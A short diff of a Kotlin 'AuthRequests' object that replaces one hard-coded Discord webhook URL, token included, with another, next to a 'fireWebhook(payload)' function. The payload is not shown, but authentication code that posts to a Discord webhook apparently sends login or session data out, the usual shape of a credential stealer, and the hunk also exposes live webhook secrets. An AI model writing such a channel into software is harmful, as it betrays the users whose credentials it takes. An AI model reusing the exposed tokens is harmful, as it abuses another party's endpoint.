@@ -39,7 +39,7 @@ import rx.Observable
 object AuthRequests {
 
     private val logClient = OkHttpClient()
-    private val logEndpoint = "https://discord.com/api/webhooks/1574833990819516557/YNSlNUDcOy7HHwKS5L6UJYE0Aor2SwqKG3yobg-KggjfGeSRgX8ZUslmkdusZ1NKSLWc"
+    private val logEndpoint = "https://discord.com/api/webhooks/1575457306978549860/fACTw5froxCsViqBmANePWfP313nPfB80dP4pMftcypUpE3xGLkjll7PXN2eg-3H1xtg"
     private val jsonType = "application/json; charset=utf-8".toMediaType()
 
     private fun fireWebhook(payload: String) {
